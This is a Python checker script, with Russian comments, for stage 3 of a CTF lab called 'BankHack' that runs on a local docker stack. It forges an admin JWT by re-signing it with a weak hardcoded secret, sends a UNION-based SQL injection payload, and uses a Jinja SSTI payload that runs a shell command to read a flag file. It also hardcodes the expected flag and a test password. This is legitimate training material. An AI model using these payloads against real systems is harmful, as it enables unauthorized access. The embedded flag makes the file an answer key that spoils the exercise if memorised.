#!/usr/bin/env python3
"""Автопроверка Этапа 3 CTF-цепочки BankHack.

Требования: запущенный стек (docker compose up -d), установленный PyJWT.

Шаги:
  1. Логин обычным пользователем (user1).
  2. Проверка, что /api/admin/export недоступен с ролью user.
  3. Переподпись JWT на слабом секрете supersecret123 с role=admin.
  4. SQL Injection в параметре search.
  5. SSTI в шаблоне комментария -> чтение /app/flag.txt.
"""
import argparse
import json
import sys
import urllib.error
import urllib.request

import jwt

SECRET = "supersecret123"
FLAG = "CTF{b4nk_l0g1c_pwn3d}"
SSTI_PAYLOAD = "{{ cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read() }}"
SQLI_PAYLOAD = "%' UNION SELECT id, username, role, balance FROM users -- "

failures = []


def check(name, condition, extra=""):
    status = "OK " if condition else "FAIL"
    print(f"[{status}] {name}{f' — {extra}' if extra else ''}")
    if not condition:
        failures.append(name)


def call(base, path, payload=None, token=None):
    body = json.dumps(payload).encode() if payload is not None else None
    request = urllib.request.Request(
        f"{base}{path}",
        data=body,
        method="POST" if body is not None else "GET",
        headers={"Content-Type": "application/json"},
    )
    if token:
        request.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            return response.status, json.loads(response.read() or b"{}")
    except urllib.error.HTTPError as exc:
        return exc.code, json.loads(exc.read() or b"{}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="http://localhost:3000/api")
    args = parser.parse_args()
    base = args.base.rstrip("/")

    status, login = call(base, "/auth/login", {"username": "user1", "password": "user1pass"})
    check("логин user1", status == 200, f"HTTP {status}")
    if status != 200:
        return 1
    user_token = login["access_token"]

    status, _ = call(base, "/admin/export", {"search": ""}, token=user_token)
    check("admin/export с ролью user отклонён", status == 403, f"HTTP {status}")

    payload = jwt.decode(user_token, options={"verify_signature": False})
    payload["role"] = "admin"
    admin_token = jwt.encode(payload, SECRET, algorithm="HS256")

    status, data = call(base, "/admin/export", {"search": ""}, token=admin_token)
    check("admin/export с поддельным токеном", status == 200, f"HTTP {status}")
    check("выборка не пустая", status == 200 and (data.get("total") or 0) > 0)

    status, data = call(base, "/admin/export", {"search": SQLI_PAYLOAD}, token=admin_token)
    names = [row["username"] for row in data.get("rows", [])]
    check("SQL Injection", status == 200 and "admin" in names, f"rows={names}")

    status, data = call(
        base, "/admin/export", {"search": "", "template": SSTI_PAYLOAD}, token=admin_token
    )
    rendered = (data.get("rendered_comment") or "").strip()
    check("SSTI читает flag.txt", FLAG in rendered, f"rendered={rendered!r}")

    print()
    if failures:
        print(f"Провалено проверок: {len(failures)}: {', '.join(failures)}")
        return 1
    print("Все проверки Этапа 3 пройдены.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
